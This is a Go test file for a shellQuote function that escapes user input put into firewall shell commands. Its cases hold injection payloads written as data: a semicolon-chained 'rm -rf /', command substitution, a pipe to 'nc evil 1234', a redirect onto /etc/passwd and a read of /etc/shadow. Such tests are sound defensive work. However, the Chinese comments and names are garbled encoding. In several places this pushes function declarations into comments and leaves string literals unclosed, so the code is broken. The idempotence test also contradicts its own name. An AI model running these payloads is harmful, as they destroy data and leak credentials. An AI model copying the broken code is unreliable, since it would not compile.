package ssh

import "testing"

// TestShellQuote 楠岃瘉 shellQuote 姝ｇ‘澶勭悊鍚勭娉ㄥ叆鍦烘櫙
//
// 鍘嗗彶鑳屾櫙锛欰ddIptablesRule / AddUfwRule / AddFirewalldRule 涔嬪墠鐩存帴鎷兼帴
// 鐢ㄦ埛杈撳叆鍒?shell 鍛戒护锛屾敾鍑昏€呭彲浠ラ€氳繃 comment 瀛楁娉ㄥ叆浠绘剰鍛戒护銆?// 杩欑粍娴嬭瘯淇濊瘉 shellQuote 鑷冲皯鑳芥尅浣忓父瑙佹敞鍏ャ€?func TestShellQuote(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		// 姝ｅ父杈撳叆搴旇鍘熸牱淇濈暀锛堝灞傚姞鍗曞紩鍙凤級
		{"鏅€氬瓧绗︿覆", "hello", "'hello'"},
		{"绌哄瓧绗︿覆", "", "''"},
		{"鏁板瓧绔彛", "8080", "'8080'"},
		{"CIDR 鍦板潃", "192.168.1.0/24", "'192.168.1.0/24'"},

		// === 娉ㄥ叆鏀诲嚮鍦烘櫙锛堣繖浜涙槸淇繖涓?bug 鐨勬牳蹇冪悊鐢憋級 ===
		{
			name: "缁忓吀鍒嗗彿娉ㄥ叆",
			in:   "tcp'; rm -rf / #",
			want: `'tcp'\''; rm -rf / #'`,
		},
		{
			name: "鍙嶅紩鍙峰懡浠ゆ浛鎹?,
			in:   "foo`whoami`bar",
			want: "'foo`whoami`bar'", // 鍗曞紩鍙峰寘瑁规椂鍙嶅紩鍙蜂笉灞曞紑锛屽畨鍏?		},
		{
			name: "$() 鍛戒护鏇挎崲",
			in:   "foo$(id)bar",
			want: "'foo$(id)bar'", // 鍚岀悊锛屽畨鍏?		},
		{
			name: "绠￠亾绗?,
			in:   "tcp | nc evil 1234",
			want: "'tcp | nc evil 1234'",
		},
		{
			name: "閲嶅畾鍚?,
			in:   "tcp > /etc/passwd",
			want: "'tcp > /etc/passwd'",
		},
		{
			name: "宸叉湁鍗曞紩鍙?,
			in:   "it's a test",
			want: `'it'\''s a test'`, // 鏍囧噯 POSIX 椋庢牸杞箟
		},
		{
			name: "澶氫釜鍗曞紩鍙?,
			in:   "''",
			want: `''\'''\'''`, // 姣忎釜 ' 鈫?'\''锛屼袱涓?' 寰楀埌 ''\'''\'''
		},
		{
			name: "鍙屽紩鍙?,
			in:   `foo"bar`,
			want: `'foo"bar'`, // 鍗曞紩鍙峰寘瑁规椂鍙屽紩鍙蜂篃瀹夊叏
		},
		{
			name: "鎹㈣绗?,
			in:   "line1\nline2",
			want: "'line1\nline2'",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := shellQuote(tc.in)
			if got != tc.want {
				t.Errorf("shellQuote(%q):\n  got:  %s\n  want: %s", tc.in, got, tc.want)
			}
		})
	}
}

// TestShellQuoteIsIdempotent 楠岃瘉杞箟鍚庣殑瀛楃涓插啀娆¤浆涔変粛鐒舵槸鍚堟硶鐨?shell 瀛楃涓?//
// 杩欐槸涓?sanity check锛氬鏋滄湁浜轰笉灏忓績瀵瑰悓涓€涓瓧绗︿覆杞箟涓ゆ锛?// 浠嶇劧涓嶅簲璇ュ紩鍏ユ柊鐨勬紡娲炪€?func TestShellQuoteIsIdempotent(t *testing.T) {
	dangerous := "tcp'; cat /etc/shadow #"
	once := shellQuote(dangerous)
	twice := shellQuote(once)

	// 浜屾杞箟鍚庝笉鑳藉啀琚畝鍗?"鍘绘帀棣栧熬鍗曞紩鍙? 杩樺師鍥?dangerous
	// 杩欐潯涓嶅彉閲忎繚璇侊細浜屾杞箟涓嶄細鍙樻垚鍗曞眰鍗曞紩鍙峰鑷?dangerous 琚敊璇毚闇?	if once == twice {
		t.Errorf("shellQuote 搴旇鏄箓绛夌殑锛屼絾涓ゆ缁撴灉鐩稿悓锛?s", once)
	}
}

